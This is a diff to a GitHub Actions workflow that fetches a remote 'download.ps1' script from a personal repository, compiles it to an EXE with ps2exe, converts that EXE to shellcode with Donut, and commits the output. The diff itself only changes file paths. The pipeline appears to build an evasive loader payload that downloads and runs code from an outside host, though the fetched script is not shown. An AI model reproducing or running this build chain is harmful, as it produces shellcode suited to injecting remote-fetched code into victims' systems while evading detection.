@@ -24,6 +24,7 @@ jobs:
         }
       shell: pwsh
       
+
     - name: Download the latest download.ps1
       run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -OutFile download.ps1
       shell: powershell
@@ -35,9 +36,9 @@ jobs:
       
     - name: Convert PS1 to EXE using ps2exe
       run: |
-        $ps2exePath = ".\ps2exe.ps1"
-        $inputScript = ".\download.ps1"
-        $outputExe = ".\download.exe"
+        $ps2exePath = ".\output\ps2exe.ps1"
+        $inputScript = ".\output\download.ps1"
+        $outputExe = ".\output\download.exe"
         powershell -File $ps2exePath -inputFile $inputScript -outputFile $outputExe
       shell: pwsh
     - name: Download Donut
@@ -47,7 +48,7 @@ jobs:
       shell: powershell
 
     - name: Convert EXE to Shellcode
-      run: .\donut_v1.0\donut.exe -i download.exe -o shellcode.bin
+      run: .\output\donut_v1.0\donut.exe -i download.exe -o shellcode.bin
       shell: powershell
 
     - name: Commit and Push changes
